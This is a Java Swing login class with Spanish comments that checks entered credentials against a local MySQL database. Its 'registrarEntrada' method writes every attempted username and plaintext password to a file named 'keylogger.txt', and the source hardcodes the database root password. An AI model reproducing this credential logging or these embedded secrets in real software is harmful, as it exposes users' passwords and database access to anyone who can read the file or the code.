package proyecto;

// Bibliotecas necesarias para la GUI
import javax.swing.*;
// Bibliotecas para manejo de archivos
import java.io.*;
// Bibliotecas para conectarse a bases de datos
import java.sql.*;
// Bibliotecas para manejar fechas y horas
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;

// Clase principal que gestiona el inicio de sesión
public class InicioSesion  {

    // Método principal que maneja el flujo del inicio de sesión
    public void iniciarSesion() {
        while (true) { // Bucle infinito para permitir múltiples intentos de inicio de sesión
            // Solicitar al usuario que ingrese su nombre de usuario
            String nombre = JOptionPane.showInputDialog("Ingrese su Nombre de Usuario:");

            // Verificar si el usuario canceló la entrada del nombre de usuario
            if (nombre == null) {
                JOptionPane.showMessageDialog(null, "Inicio de sesión cancelado.",
                        "Cancelación de Sesión", JOptionPane.INFORMATION_MESSAGE);
                break; // Salir del bucle si se cancela el inicio de sesión
            }

            // Validar si el nombre de usuario está vacío
            if (nombre.trim().isEmpty()) {
                JOptionPane.showMessageDialog(null, "Debe ingresar su nombre de usuario.",
                        "Error de Sesión", JOptionPane.ERROR_MESSAGE);
                continue; // Reiniciar el bucle
            }

            // Validar si el nombre de usuario contiene caracteres no válidos
            if (!esNombreValido(nombre)) {
                JOptionPane.showMessageDialog(null, "El nombre de usuario solo debe contener letras.",
                        "Error de Validación", JOptionPane.ERROR_MESSAGE);
                continue; // Reiniciar el bucle
            }

            // Solicitar al usuario que ingrese su contraseña mediante un campo seguro
            JPasswordField contraseñaField = new JPasswordField();
            int option = JOptionPane.showConfirmDialog(null, contraseñaField, "Ingrese su Contraseña:",
                    JOptionPane.OK_CANCEL_OPTION);

            // Verificar si el usuario canceló la entrada de la contraseña
            if (option != JOptionPane.OK_OPTION) {
                JOptionPane.showMessageDialog(null, "Inicio de sesión cancelado.",
                        "Cancelación de Sesión", JOptionPane.INFORMATION_MESSAGE);
                break; // Salir del bucle si se cancela el inicio de sesión
            }

            // Convertir la contraseña ingresada a un formato String
            String contraseña = new String(contraseñaField.getPassword());

            // Validar si la contraseña está vacía
            if (contraseña.trim().isEmpty()) {
                JOptionPane.showMessageDialog(null, "Debe ingresar una contraseña.",
                        "Error de Sesión", JOptionPane.ERROR_MESSAGE);
                continue; // Reiniciar el bucle
            }

            // Registrar el intento de inicio de sesión en un archivo keylogger
            registrarEntrada(nombre, contraseña);

            // Validar las credenciales ingresadas contra la base de datos
            if (validarCredenciales(nombre, contraseña)) {
                JOptionPane.showMessageDialog(null, "Inicio de sesión exitoso.",
                        "Ingreso Realizado", JOptionPane.INFORMATION_MESSAGE);
                break; // Salir del bucle si las credenciales son correctas
            } else {
                JOptionPane.showMessageDialog(null, "Datos incorrectos. Intente nuevamente.",
                        "Error de Sesión", JOptionPane.ERROR_MESSAGE);
            }
        }
    }

    // Método para registrar los intentos de inicio de sesión en un archivo keylogger
    private void registrarEntrada(String nombre, String password) {
        // Ruta del archivo donde se registrarán los intentos
        String rutaArchivo = "keylogger.txt"; 
        try (FileWriter fw = new FileWriter(rutaArchivo, true);
             BufferedWriter bw = new BufferedWriter(fw);
             PrintWriter pw = new PrintWriter(bw)) {

            // Obtener la fecha y hora actual
            LocalDateTime ahora = LocalDateTime.now();
            DateTimeFormatter formato = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String fechaHora = ahora.format(formato);

            // Escribir el intento de inicio de sesión en el archivo
            pw.println("[" + fechaHora + "] Usuario: " + nombre + ", Contraseña: " + password);
            // Capturar errores relacionados con el manejo de archivos
        } catch (IOException e) { 
            System.err.println("Error al escribir en el archivo keylogger:");
            e.printStackTrace();
        }
    }

    // Método para validar que el nombre de usuario contenga solo letras y espacios
    public static boolean esNombreValido(String nombre) {
        // Iterar por cada carácter del nombre
        for (char c : nombre.toCharArray()) { 
            // Verificar si no es letra o espacio
            if (!Character.isLetter(c) && !Character.isWhitespace(c)) { 
                // Retornar false si encuentra un carácter inválido
                return false; 
            }
        }
        return true; // Retornar true si todos los caracteres son válidos
    }

    // Método para validar las credenciales contra una base de datos
    public static boolean validarCredenciales(String nombre, String password) {
        // Objeto para manejar la conexión a la base de datos
        Connection conn = null; 
        // Objeto para preparar y ejecutar consultas SQL
        PreparedStatement stmt = null; 
        // Objeto para almacenar los resultados de la consulta
        ResultSet rs = null; 

        try {
            // Conectar a la base de datos usando los parámetros especificados
            conn = DriverManager.getConnection("jdbc:mysql://localhost:3306/Juegos", "root", "Mantismarina2");

            // Preparar la consulta SQL para buscar las credenciales
            String sql = "SELECT * FROM Registros WHERE nombre = ? AND password = ?";
            stmt = conn.prepareStatement(sql);
            // Establecer el nombre como parámetro
            stmt.setString(1, nombre); 
            // Establecer la contraseña como parámetro
            stmt.setString(2, password); 
             // Ejecutar la consulta
            rs = stmt.executeQuery();

            // Retornar true si se encuentra un registro que coincide
            return rs.next();
            // Capturar errores relacionados con la base de datos
        } catch (SQLException e) { 
            System.err.println("Error al conectar con la base de datos:");
            e.printStackTrace();
            return false;

        } finally {
            // Cerrar recursos para evitar fugas de memoria
            try {
                if (rs != null) rs.close();
                if (stmt != null) stmt.close();
                if (conn != null) conn.close();
            } catch (SQLException e) {
                System.err.println("Error al cerrar recursos:");
                e.printStackTrace();
            }
        }
    }
}